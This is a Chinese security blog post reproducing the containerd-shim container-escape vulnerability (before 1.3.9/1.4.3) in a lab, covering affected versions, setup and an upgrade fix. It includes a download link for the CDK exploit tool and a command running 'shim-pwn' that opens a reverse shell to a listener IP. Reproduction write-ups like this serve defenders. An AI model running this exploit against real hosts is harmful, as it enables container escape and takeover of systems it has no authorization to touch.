> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tyxJhqcZ3QTSjAqTZZSgrA)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：水木逸轩** **@Timeline Sec**

**本文字数：539**

**阅读时长：2～3min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

Containerd 是一个工业级标准的容器运行时，它强调简单性、健壮性和可移植性。Containerd 可以在宿主机中管理完整的容器生命周期：容器镜像的传输和存储、容器的执行和管理、存储和网络等。

**0x02 漏洞概述**  

  

在版本 1.3.9 和 1.4.3 之前的容器中，容器填充的 API 不正确地暴露给主机网络容器。填充程序的 API 套接字的访问控制验证了连接过程的有效 UID 为 0，但没有以其他方式限制对抽象 Unix 域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效 UID 为 0，但特权降低）导致新进程以提升的特权运行。

**0x03 影响版本**  

  

containerd < 1.4.3

containerd < 1.3.9

**0x04 环境搭建**  

  

Docker 版本查看：  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jiasNWCgWFauh8IQwJBYCyCTQJSYWjdEiaFvYJqEibxnZVrYrFx47PQpjbog/640?wx_fmt=png)

符合要求

查看 docker 宿主机内核版本：  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jias2T9HMVIoKkJxUw1E5MibCpR3JaqM9FfY2zH53c1ibOsAQibyVCOx3DjSg/640?wx_fmt=png)

下载 poc

```
https://github.com/Xyntax/CDK/releases/tag/0.1.6
```

将与内核类型对应的 poc 复制到虚拟机的容器中  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jiasFd4MAy82NPgzv8jSBGb31QLZeNNwETqOSsdpjVc68NEibbpibxIu71QQ/640?wx_fmt=png)  

```
docker cp cdk_linux_386 容器ID:/tmp
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jiasfLU26lc5NiaicibtaY9GVRnPXNDWuibFFSRkLAW1TpU1Nz4scBLLg7f0Yw/640?wx_fmt=png)  

docker ps 查看当前运行的镜像：  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jiasdYgeSXBUOibhB1nLL4HT4pMRticcRuc3taqCEe883AjeyhWhTib0gkb5A/640?wx_fmt=png)

进入镜像，poc 已复制到镜像中：  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jias92VMja3LsbNI1xtpVrvBv634stI8GefxhCj20Mz0nWX8WVEGWDaaag/640?wx_fmt=png)

**0x05 漏洞复现**  

  

执行 poc，到监听侧进行查看

```
./cdk_linux_386 run shim-pwn 192.168.254.132 6666
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jiasez0800BCKpNujafWRPc4ia3FhB9U1s6ryf5I2beFQ1EZnDeMbH8DBiaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjRFVUuGZEIFbicEYOd20jiasKFrZzLclqrzMY6VaCNV3THYpK3czsTFpcicW0eGMNfqHRNZCLgMzYZQ/640?wx_fmt=png)

反弹成功

**0x06 修复方式**  

  

升级 containerd 至最新版本。

```
参考链接：
```

https://blog.csdn.net/weixin_45728976/article/details/110452543

https://blog.csdn.net/weixin_45728976/article/details/110694414

https://mp.weixin.qq.com/s/4VPle19F2gKmhrMrgYKroQ

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行